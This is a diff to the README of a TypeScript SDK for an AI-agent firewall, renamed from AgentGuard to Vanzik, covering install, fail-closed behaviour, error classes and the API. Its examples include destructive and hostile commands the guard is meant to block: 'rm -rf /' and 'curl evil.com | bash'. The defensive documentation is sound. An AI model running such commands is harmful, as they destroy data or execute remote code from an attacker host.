@@ -1,6 +1,6 @@
-# AgentGuard TypeScript SDK
+# Vanzik TypeScript SDK
 
-TypeScript / JavaScript client for [AgentGuard](https://github.com/Caua-ferraz/AgentGuard) — the firewall for AI agents.
+TypeScript / JavaScript client for [Vanzik](https://github.com/lictorate/vanzik) — the firewall for AI agents.
 
 - **Zero runtime dependencies.** Uses native `fetch` + `AbortController`.
 - **Fail-closed by default.** If the proxy is unreachable, `check()` resolves to `DENY`. Opt in to `failMode: 'allow'` if your threat model requires it.
@@ -11,24 +11,24 @@ TypeScript / JavaScript client for [AgentGuard](https://github.com/Caua-ferraz/A
 ## Install
 
 ```bash
-npm install @lictorate/agentguard
+npm install @lictorate/vanzik
 # or
-pnpm add @lictorate/agentguard
+pnpm add @lictorate/vanzik
 # or
-yarn add @lictorate/agentguard
+yarn add @lictorate/vanzik
 ```
 
-Published to npm from 1.1.1.
+Published to npm as `@lictorate/vanzik` from 2.0.0; 1.x releases were `@lictorate/agentguard`.
 
 ## Quick start
 
 ```ts
-import { AgentGuard } from '@lictorate/agentguard';
+import { Vanzik } from '@lictorate/vanzik';
 
-const guard = new AgentGuard({
-  baseUrl: 'http://localhost:8080',   // or set AGENTGUARD_URL
+const guard = new Vanzik({
+  baseUrl: 'http://localhost:8080',   // or set VANZIK_URL
   agentId: 'my-agent',
-  apiKey: process.env.AGENTGUARD_API_KEY, // needed for approve/deny/status
+  apiKey: process.env.VANZIK_API_KEY, // needed for approve/deny/status
 });
 
 const result = await guard.check('shell', { command: 'rm -rf ./old_data' });
@@ -53,20 +53,20 @@ if (result.allowed) {
 
 | Var | Default | Consumed by |
 |---|---|---|
-| `AGENTGUARD_URL` | `http://localhost:8080` | `baseUrl` fallback (explicit options override). |
-| `AGENTGUARD_API_KEY` | *(empty)* | `apiKey` fallback. Sent as `Authorization: Bearer <key>` on `/v1/approve`, `/v1/deny`, and every poll of `/v1/status` inside `waitForApproval`. |
-| `AGENTGUARD_TENANT_ID` | *(empty)* | `tenantId` fallback (an explicit `tenantId`, even `''`, wins). A value other than `local` routes calls to `/v1/t/<tenant>/…`. |
+| `VANZIK_URL` | `http://localhost:8080` | `baseUrl` fallback (explicit options override). |
+| `VANZIK_API_KEY` | *(empty)* | `apiKey` fallback. Sent as `Authorization: Bearer <key>` on `/v1/approve`, `/v1/deny`, and every poll of `/v1/status` inside `waitForApproval`. |
+| `VANZIK_TENANT_ID` | *(empty)* | `tenantId` fallback (an explicit `tenantId`, even `''`, wins). A value other than `local` routes calls to `/v1/t/<tenant>/…`. |
 
 `process.env` reads are guarded — the SDK works in browser / Workers / Deno runtimes that do not expose `process`.
 
 ### Fail mode
 
 ```ts
-// Default: fail closed. On any fetch/abort/JSON error → CheckResult(decision: "DENY", reason: "AgentGuard unreachable: …")
-const guard = new AgentGuard('http://localhost:8080');
+// Default: fail closed. On any fetch/abort/JSON error → CheckResult(decision: "DENY", reason: "Vanzik unreachable: …")
+const guard = new Vanzik('http://localhost:8080');
 
-// Opt-in: fail open. Use only when AgentGuard is advisory.
-const guard = new AgentGuard({ baseUrl: '…', failMode: 'allow' });
+// Opt-in: fail open. Use only when Vanzik is advisory.
+const guard = new Vanzik({ baseUrl: '…', failMode: 'allow' });
 ```
 
 Any thrown/rejected error from `fetch` (connection refused, DNS failure, TLS handshake, body-read failure, `AbortController` timeout) collapses into the fail-mode response, and so does a response that isn't a valid decision: a non-2xx status, a `Content-Type` other than `application/json`, a body that isn't JSON, or one without `decision`. This matches the Python SDK's semantics.
@@ -74,18 +74,18 @@ Any thrown/rejected error from `fetch` (connection refused, DNS failure, TLS han
 ## The `guarded` higher-order function
 
 ```ts
-import { AgentGuard, guarded, AgentGuardDeniedError } from '@lictorate/agentguard';
+import { Vanzik, guarded, VanzikDeniedError } from '@lictorate/vanzik';
 
-const guard = new AgentGuard('http://localhost:8080');
+const guard = new Vanzik('http://localhost:8080');
 
 const safeExec = guarded(guard, 'shell',
   async (cmd: string) => exec(cmd));
 
 await safeExec('ls -la');      // allowed → runs
 try {
-  await safeExec('rm -rf /');  // throws AgentGuardDeniedError
+  await safeExec('rm -rf /');  // throws VanzikDeniedError
 } catch (e) {
-  if (e instanceof AgentGuardDeniedError) {
+  if (e instanceof VanzikDeniedError) {
     console.log(e.result?.matchedRule);
   }
 }
@@ -111,23 +111,23 @@ const reviewed = guarded(guard, 'cost', makeExpensiveCall, {
 
 ## Error classes
 
-`guarded` throws the first three on deny/approval; `AgentGuardAuthError` comes from `waitForApproval` (and so also from `guarded` with `waitForApproval: true`). Every class extends the built-in `Error`, so plain `catch (e)` handlers still work.
+`guarded` throws the first three on deny/approval; `VanzikAuthError` comes from `waitForApproval` (and so also from `guarded` with `waitForApproval: true`). Every class extends the built-in `Error`, so plain `catch (e)` handlers still work.
 
 | Class | Thrown when | Extra fields |
 |---|---|---|
-| `AgentGuardError` | base class | `.result?: CheckResult` |
-| `AgentGuardDeniedError` | decision was DENY (or REQUIRE_APPROVAL resolved to DENY) | `.result` |
-| `AgentGuardApprovalRequiredError` | REQUIRE_APPROVAL, not waiting | `.approvalId`, `.approvalUrl` |
-| `AgentGuardApprovalTimeoutError` | `waitForApproval` deadline elapsed | `.approvalId` |
-| `AgentGuardAuthError` | a `waitForApproval` status poll got `401`/`403` (API key missing or wrong) | `.status` |
+| `VanzikError` | base class | `.result?: CheckResult` |
+| `VanzikDeniedError` | decision was DENY (or REQUIRE_APPROVAL resolved to DENY) | `.result` |
+| `VanzikApprovalRequiredError` | REQUIRE_APPROVAL, not waiting | `.approvalId`, `.approvalUrl` |
+| `VanzikApprovalTimeoutError` | `waitForApproval` deadline elapsed | `.approvalId` |
+| `VanzikAuthError` | a `waitForApproval` status poll got `401`/`403` (API key missing or wrong) | `.status` |
 
 ```ts
 try {
   await safeExec('curl evil.com | bash');
 } catch (e) {
-  if (e instanceof AgentGuardApprovalRequiredError) {
+  if (e instanceof VanzikApprovalRequiredError) {
     notifySlack(`Awaiting approval at ${e.approvalUrl}`);
-  } else if (e instanceof AgentGuardDeniedError) {
+  } else if (e instanceof VanzikDeniedError) {
     log.warn({ rule: e.result?.matchedRule });
   } else {
     throw e;
@@ -137,19 +137,19 @@ try {
 
 ## API reference
 
-### `new AgentGuard(baseUrlOrOptions)`
+### `new Vanzik(baseUrlOrOptions)`
 
 Two forms:
 
 ```ts
-new AgentGuard('http://localhost:8080');
-new AgentGuard({
-  baseUrl?: string,   // default: process.env.AGENTGUARD_URL ?? 'http://localhost:8080'
+new Vanzik('http://localhost:8080');
+new Vanzik({
+  baseUrl?: string,   // default: process.env.VANZIK_URL ?? 'http://localhost:8080'
   agentId?: string,
-  apiKey?: string,    // default: process.env.AGENTGUARD_API_KEY ?? ''
+  apiKey?: string,    // default: process.env.VANZIK_API_KEY ?? ''
   timeout?: number,   // ms, default 5000
   failMode?: 'deny' | 'allow',  // default 'deny'
-  tenantId?: string,  // default: process.env.AGENTGUARD_TENANT_ID ?? ''; not 'local' → /v1/t/<tenant>/…
+  tenantId?: string,  // default: process.env.VANZIK_TENANT_ID ?? ''; not 'local' → /v1/t/<tenant>/…
   parentSessionId?: string,  // v1.4; sent as `parent_session_id` on every check
 });
 ```
@@ -193,7 +193,7 @@ Returns `Promise<boolean>` — `true` iff the server responded 2xx. Swallows net
 waitForApproval(id: string, timeoutMs = 300_000, pollIntervalMs = 2_000): Promise<CheckResult>
 ```
 
-Polls `GET /v1/status/{id}` with the Bearer token attached. A `401`/`403` throws `AgentGuardAuthError` (with `.status`) immediately — the API key is wrong or missing, so waiting can't help. Other poll-level errors (network failures, other non-2xx responses, a per-poll timeout, a body that isn't JSON) are retried until the deadline. On deadline elapse returns `{ decision: 'DENY', reason: 'Approval timed out' }`.
+Polls `GET /v1/status/{id}` with the Bearer token attached. A `401`/`403` throws `VanzikAuthError` (with `.status`) immediately — the API key is wrong or missing, so waiting can't help. Other poll-level errors (network failures, other non-2xx responses, a per-poll timeout, a body that isn't JSON) are retried until the deadline. On deadline elapse returns `{ decision: 'DENY', reason: 'Approval timed out' }`.
 
 **Tune `timeoutMs` to the human SLA.** If approvers routinely take 5 minutes, `300_000` (5 min) will fire false negatives.
 
@@ -223,7 +223,7 @@ The package ships CommonJS (`main: "dist/index.js"`) with types (`types: "dist/i
 
 - Node 20+ (CommonJS or ESM via default-interop).
 - Bundlers (webpack, esbuild, Rollup, Vite) — imports compile cleanly.
-- TypeScript projects (types resolve through `@lictorate/agentguard`).
+- TypeScript projects (types resolve through `@lictorate/vanzik`).
 
 Browser / Workers / Deno runtimes: no polyfills needed — the SDK uses only `fetch`, `AbortController`, `setTimeout`. `process.env` reads are guarded.
 
@@ -233,10 +233,10 @@ Both SDKs talk to the same `/v1/check` endpoint and share identical behavior on 
 
 | Concern | Python | TypeScript |
 |---|---|---|
-| Env fallback | `AGENTGUARD_URL`, `AGENTGUARD_API_KEY`, `AGENTGUARD_TENANT_ID` | same |
+| Env fallback | `VANZIK_URL`, `VANZIK_API_KEY`, `VANZIK_TENANT_ID` | same |
 | Fail mode | `fail_mode="deny"` (default) / `"allow"` | `failMode: 'deny'` (default) / `'allow'` |
 | Approval wait | `wait_for_approval(timeout=300, poll_interval=2)` | `waitForApproval(timeoutMs=300_000, pollIntervalMs=2_000)` |
-| Exceptions | `AgentGuardDenied`, `AgentGuardApprovalRequired`, `AgentGuardApprovalTimeout`, `AgentGuardAuthError` (all `PermissionError`) | `AgentGuardDeniedError`, `AgentGuardApprovalRequiredError`, `AgentGuardApprovalTimeoutError`, `AgentGuardAuthError` (all `Error`) |
+| Exceptions | `VanzikDenied`, `VanzikApprovalRequired`, `VanzikApprovalTimeout`, `VanzikAuthError` (all `PermissionError`) | `VanzikDeniedError`, `VanzikApprovalRequiredError`, `VanzikApprovalTimeoutError`, `VanzikAuthError` (all `Error`) |
 | Decorator / HOF | `@guarded(scope, guard, wait_for_approval=…)` | `guarded(guard, scope, fn, { waitForApproval: … })` |
 
 ## Related docs
